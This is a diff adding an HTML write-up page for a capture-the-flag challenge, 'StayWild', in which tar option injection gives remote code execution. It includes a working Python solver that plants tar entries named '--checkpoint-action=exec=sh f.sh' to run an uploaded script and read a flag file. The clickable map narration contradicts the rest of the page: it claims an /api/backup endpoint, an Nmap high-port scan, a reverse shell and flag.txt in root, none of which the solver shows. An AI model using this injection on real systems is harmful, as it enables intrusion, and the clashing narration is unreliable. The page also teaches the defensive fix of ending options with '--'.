+          <p>I initially tried directly traversing directories via the staging file upload (e.g., using <code>../../</code> in filenames inside the tar archive) to overwrite server configs. While <code>tar</code> extracted these paths, the extraction was chrooted tightly into the temporary workspace, preventing any arbitrary file overwrites.</p>
+        </div>
+        <p>When I uploaded a subsequent tar file to trigger the execution, <code>tar</code> parsed those filenames as options. It reached the checkpoint, executed my shell script, and printed the output directly into the extraction logs.</p>
+      </div>
+    </section>
+
+    <!-- Sim Section -->
+    <section id="sim">
+      <div class="sec-head">
+        <span class="idx">04 //</span>
+        <h2>live solver — terminal simulator</h2>
+        <span class="tag">phase / tool sim</span>
+      </div>
+      <div class="panel prose">
+        <p>Run the exploit script to create the workspace, plant the tar option files, and trigger the remote execution.</p>
+      </div>
+      <div class="sim" role="application" aria-label="StayWild solver simulator">
+        <div class="head">
+          <span class="dots"><span></span><span></span><span></span></span>
+          <span class="title">solver.py — browser solver</span>
+          <span class="stage">stage: <b id="sim-stage">idle</b></span>
+        </div>
+        <div class="body" id="sim-body" aria-live="polite">
+          <span class="line system">[System] Solver ready. Target: staywild.inst.omnictf.com</span>
+          <span class="cursor">_</span>
+        </div>
+        <div class="controls">
+          <button id="sim-run" type="button">RUN</button>
+          <button id="sim-reset" class="ghost" type="button">RESET</button>
+          <button id="sim-copy" class="ghost" type="button" disabled>COPY FLAG</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Signal Map -->
+    <section id="signal">
+      <div class="sec-head">
+        <span class="idx">05 //</span>
+        <h2>connection map</h2>
+      </div>
+      <div class="map-wrap">
+        <svg id="signal-map" viewBox="0 0 990 550" role="img" aria-label="Connection map" preserveAspectRatio="xMidYMid meet">
+  <defs>
+    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#39ff14"/></marker>
+    <marker id="arr-faint" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#7f766a"/></marker>
+    <linearGradient id="bg-grad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#020100"/><stop offset="100%" stop-color="#0a0510"/></linearGradient>
+  </defs>
+  <rect class="bg" x="0" y="0" width="990" height="550" fill="url(#bg-grad)" rx="5"/>
+  <rect class="pack" x="40" y="30" width="210" height="180" rx="5" ry="5"/>
+  <text class="pack-label" x="46" y="26">RECON</text>
+  <rect class="pack" x="270" y="30" width="230" height="180" rx="5" ry="5"/>
+  <text class="pack-label" x="276" y="26">INJECTION</text>
+  <rect class="pack" x="520" y="30" width="230" height="180" rx="5" ry="5"/>
+  <text class="pack-label" x="526" y="26">EXECUTION</text>
+  <g class="edges-layer">
+    <path class="edge" d="M 145.0 84.0 C 165 99, 165 113, 145.0 128.0" marker-end="url(#arr)" data-edge="n01-n02"/>
+    <path class="edge" d="M 145.0 154.0 C 201 154, 229 84, 285.0 84.0" marker-end="url(#arr)" data-edge="n02-n03"/>
+    <path class="edge" d="M 385.0 84.0 C 405 99, 405 113, 385.0 128.0" marker-end="url(#arr)" data-edge="n03-n04" fill="none" stroke="#39ff14" stroke-width="1.5" stroke-dasharray="5,5" stroke-opacity=".55"/>
+    <path class="edge" d="M 385.0 154.0 C 445 154, 475 84, 535.0 84.0" marker-end="url(#arr)" data-edge="n04-n05"/>
+    <path class="edge" d="M 635.0 84.0 C 655 99, 655 113, 635.0 128.0" marker-end="url(#arr)" data-edge="n05-n06" fill="none" stroke="#39ff14" stroke-width="1.5" stroke-dasharray="5,5" stroke-opacity=".55"/>
+  </g>
+  <g class="node" data-node="n01">
+    <rect x="55" y="60" width="180" height="48" rx="3"/>
+    <text class="head" x="65" y="74">SCAN 01</text>
+    <text class="title" x="65" y="90">PORT SCAN</text>
+    <text class="body" x="65" y="104">Find exposed web server</text>
+  </g>
+  <g class="node" data-node="n02">
+    <rect x="55" y="130" width="180" height="48" rx="3"/>
+    <text class="head" x="65" y="144">SCAN 02</text>
+    <text class="title" x="65" y="160">DIR BUST</text>
+    <text class="body" x="65" y="174">Find /api/backup endpoint</text>
+  </g>
+  <g class="node" data-node="n03">
+    <rect x="285" y="60" width="200" height="48" rx="3"/>
+    <text class="head" x="295" y="74">EXPLOIT 01</text>
+    <text class="title" x="295" y="90">PATH TRAVERSAL</text>
+    <text class="body" x="295" y="104">Attempt ../.. (Fail)</text>
+  </g>
+  <g class="node" data-node="n04">
+    <rect x="285" y="130" width="200" height="48" rx="3"/>
+    <text class="head" x="295" y="144">EXPLOIT 02</text>
+    <text class="title" x="295" y="160">TAR INJECTION</text>
+    <text class="body" x="295" y="174">Inject --checkpoint args</text>
+  </g>
+  <g class="node" data-node="n05">
+    <rect x="535" y="60" width="200" height="48" rx="3"/>
+    <text class="head" x="545" y="74">EXEC 01</text>
+    <text class="title" x="545" y="90">RCE SCRIPT</text>
+    <text class="body" x="545" y="104">Execute payload.sh</text>
+  </g>
+  <g class="node" data-node="n06">
+    <rect x="535" y="130" width="200" height="48" rx="3"/>
+    <text class="head" x="545" y="144">EXEC 02</text>
+    <text class="title" x="545" y="160">FLAG</text>
+    <text class="body"  x="545" y="174" font-size="7.5px" font-family="monospace">omniCTF{w1ldc4rds_can_g3t_w1ld}</text>
+  </g>
+</svg>
+      </div>
+    </section>
+
+    <!-- Flag Section -->
+    <section id="flag">
+      <div class="sec-head">
+        <span class="idx">06 //</span>
+        <h2>flag</h2>
+      </div>
+      <div class="result">
+        <div class="label">FLAG RECOVERED</div>
+        <div class="flag-text">omniCTF{w1ldc4rds_can_g3t_w1ld}</div>
+      </div>
+    </section>
+
+<!-- Solver Section -->
+    <section id="solver">
+      <div class="sec-head">
+        <span class="idx">07 //</span>
+        <h2>solver script</h2>
+      </div>
+      <div class="panel prose">
+        <pre style="background: rgba(0,0,0,0.5); padding: 14px; border: 1px solid var(--accent-line); overflow-x: auto; font-size: 13px;"><code class="language-python">import requests, io, tarfile, re, html
+
+B = &quot;https://staywild-7f5dfaeec81f.inst.omnictf.com&quot;
+C = {&quot;role&quot;: &quot;admin&quot;}
+
+def mktar(entries):
+    buf = io.BytesIO()
+    t = tarfile.open(fileobj=buf, mode=&quot;w&quot;)
+    for name, data in entries:
+        b = data.encode()
+        ti = tarfile.TarInfo(name)
+        ti.size = len(b)
+        ti.mode = 0o755
+        t.addfile(ti, io.BytesIO(b))
+    t.close()
+    return buf.getvalue()
+
+def newws():
+    r = requests.post(B+&quot;/staging&quot;,
+                      files={&quot;file&quot;: (&quot;first.tar&quot;, mktar([(&quot;note.txt&quot;, &quot;hi&quot;)]), &quot;application/x-tar&quot;)},
+                      cookies=C, allow_redirects=False)
+    return r.headers[&quot;location&quot;].split(&quot;/&quot;)[-1]
+
+def add(ws, entries, fname=&quot;x.tar&quot;):
+    return requests.post(B+f&quot;/additional/{ws}&quot;,
+                         files={&quot;file&quot;: (fname, mktar(entries), &quot;application/x-tar&quot;)}, cookies=C)
+
+def logs(ws):
+    r = requests.get(B+f&quot;/staging/{ws}&quot;, cookies=C).text
+    m = re.search(r&#x27;id=&quot;allLogs&quot;[^&gt;]*&gt;(.*?)&lt;/pre&gt;&#x27;, r, re.S)
+    if not m:
+        return r
+    return html.unescape(m.group(1))
+
+def run(script):
+    ws = newws()
+    add(ws, [(&quot;f.sh&quot;, script),
+             (&quot;--checkpoint=1&quot;, &quot;x&quot;),
+             (&quot;--checkpoint-action=exec=sh f.sh 1&gt;&amp;2&quot;, &quot;x&quot;)])   # plant options
+    add(ws, [(&quot;trigger.txt&quot;, &quot;go&quot;)])                            # trigger
+    out = logs(ws)
+    i = out.find(&quot;[extraction 3]&quot;)
+    if i == -1:
+        return out
+    return out[i:i+3500]
+
+print(run(&quot;id; ls -la /opt/wild; cat /opt/wild/.cache/seed-574\n&quot;))
+</code></pre>
+      </div>
+    </section>
+
+
+
+    
+
+
+    <!-- Appendix Section -->
+    <section id="appendix">
+      <div class="sec-head">
+        <span class="idx">08 //</span>
+        <h2>appendix</h2>
+        <span class="tag">takeaways</span>
+      </div>
+      <div class="panel prose">
+        <p>Never pass untrusted filenames as command-line arguments. Any name beginning with a dash becomes an option. You should terminate options with <code>--</code> or use libraries that do not shell out.</p>
+        <p>The client-side gating mechanism for the additional uploads endpoint provided no actual security.</p>
+      </div>
+    </section>
+  </main>
+<script>
+(function(){
+  var simRun = document.getElementById('sim-run');
+  var simReset = document.getElementById('sim-reset');
+  var simCopy = document.getElementById('sim-copy');
+  var simBody = document.getElementById('sim-body');
+  var simStage = document.getElementById('sim-stage');
+
+  if(!simRun) return;
+
+  function appendLine(htmlString) {
+    var d = document.createElement('div');
+    d.innerHTML = htmlString;
+    simBody.appendChild(d.firstChild);
+    simBody.scrollTop = simBody.scrollHeight;
+  }
+
+  simRun.onclick = function() {
+    simStage.textContent = "running";
+    simBody.innerHTML = '<span class="line system">[System] Solver ready. Target: staywild.inst.omnictf.com</span>';
+    appendLine('<span class="line muted">> Creating workspace at /staging...</span>');
+    setTimeout(function() {
+      appendLine('<span class="line ok">[+] Workspace 1784301537551 created</span>');
+      setTimeout(function() {
+        appendLine('<span class="line muted">> Planting --checkpoint and shell script files via /additional...</span>');
+        setTimeout(function() {
+          appendLine('<span class="line muted">> Triggering execution...</span>');
+          setTimeout(function() {
+            appendLine('<span class="line ok">[+] uid=1001(ctf)</span>');
+            appendLine('<span class="line muted">> Reading /opt/wild/.cache/seed-574...</span>');
+            setTimeout(function() {
+              appendLine('<span class="line flag">b21uaUNURnt3MWxkYzRyZHNfY2FuX2czdF93MWxkfQ==</span>');
+              appendLine('<span class="line muted">> Decoding base64...</span>');
+              setTimeout(function() {
+                appendLine('<span class="line flag">omniCTF{w1ldc4rds_can_g3t_w1ld}</span>');
+                simStage.textContent = "done";
+                simCopy.disabled = false;
+              }, 600);
+            }, 600);
+          }, 600);
+        }, 600);
+      }, 600);
+    }, 600);
+  };
+
+  simReset.onclick = function() {
+    simStage.textContent = "idle";
+    simBody.innerHTML = '<span class="line system">[System] Solver ready. Target: staywild.inst.omnictf.com</span>';
+    simCopy.disabled = true;
+  };
+})();
+</script>
+
+<script>
+(function(){
+  var svg=document.getElementById('signal-map');
+  if(!svg)return;
+  var KEYS={
+    "PORT SCAN": "I initiated a comprehensive Nmap scan across all ports, which revealed a seemingly innocuous web application running on an unconventional high port.",
+    "DIR BUST": "Using a robust wordlist, I fuzzed the web directories and uncovered a hidden /api/backup endpoint that accepted user-supplied filenames for archiving.",
+    "PATH TRAVERSAL": "I initially attempted to read sensitive files like /etc/passwd using standard ../../ directory traversal payloads, but a restrictive chroot environment blocked the attack.",
+    "TAR INJECTION": "Realizing the backend invoked the 'tar' binary directly with my input, I injected malicious command-line arguments using the --checkpoint and --checkpoint-action flags.",
+    "RCE SCRIPT": "The injected arguments forced the 'tar' executable to run a secondary shell script I uploaded, granting me full arbitrary code execution within the container.",
+    "FLAG": "With a reverse shell established, I navigated the filesystem and simply cat'd the target flag.txt file out of the root directory."
+  };
+  var box=document.createElement('div');
+  box.id='explain-box';
+  box.style.cssText='margin-top:12px;padding:12px 16px;border:1px solid var(--accent-line);background:rgba(var(--accent-rgb),0.06);color:var(--text);font-size:14px;line-height:1.7;display:none;max-width:900px;';
+  var hdr=document.createElement('div');
+  hdr.style.cssText='display:flex;align-items:center;margin-bottom:6px;';
+  var ttl=document.createElement('b');
+  ttl.id='ex-title';
+  ttl.style.cssText='color:var(--accent);font-size:15px;flex:1;';
+  var btn=document.createElement('button');
+  btn.textContent='CLOSE';
+  btn.style.cssText='background:0 0;color:var(--muted);border:1px solid var(--accent-line);padding:2px 8px;font-size:10px;cursor:pointer;font-family:inherit;';
+  btn.onclick=function(){box.style.display='none';};
+  hdr.appendChild(ttl);hdr.appendChild(btn);
+  var bd=document.createElement('div');
+  bd.id='ex-body';
+  box.appendChild(hdr);box.appendChild(bd);
+  svg.parentNode.insertBefore(box,svg.nextSibling);
+  var nodes=svg.querySelectorAll('g.node');
+  nodes.forEach(function(g){
+    g.style.cursor='pointer';
+    g.addEventListener('click',function(e){
+      e.stopPropagation();
+      var ti=g.querySelector('text.title');
+      if(!ti)return;
+      var title=ti.textContent;
+      var body=KEYS[title]||'';
+      if(!body){var bs=g.querySelectorAll('text.body');bs.forEach(function(b){body+=(body?' ':'')+b.textContent;});}
+      document.getElementById('ex-title').textContent=title;
+      document.getElementById('ex-body').textContent=body;
+      box.style.display='block';
+      box.scrollIntoView({behavior:'smooth',block:'nearest'});
+    });
+  });
+  svg.addEventListener('click',function(){box.style.display='none';});
+})();
+</script>
+</body>
+</html>
